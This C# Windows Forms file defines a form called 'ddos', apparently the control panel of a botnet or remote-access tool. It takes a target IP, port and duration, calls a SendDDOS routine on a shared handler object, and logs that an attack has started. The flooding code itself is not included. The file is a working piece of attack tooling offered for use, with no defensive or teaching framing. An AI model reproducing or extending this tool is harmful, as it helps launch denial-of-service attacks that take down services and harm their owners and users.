using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Dragon_
{
    public partial class ddos : Form
    {
        public ddos()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "")
            {
                MessageBox.Show("The IP Cannot be emtpy", "Info");
                return;
            }
            if (textBox2.Text == "")
            {
                MessageBox.Show("The Port Cannot be emtpy", "Info");
                return;
            }
            if (textBox3.Text == "")
            {
                MessageBox.Show("The Duration Cannot be emtpy", "Info");
                return;
            }
            var ip = textBox1.Text;
            var port = Convert.ToInt32(textBox2.Text);
            var duration = Convert.ToInt32(textBox3.Text);

            Program.hh.SendDDOS(ip, port, duration);
            Program.Log($"Started a DDOS Attack on {ip}:{port}");
        }
    }
}
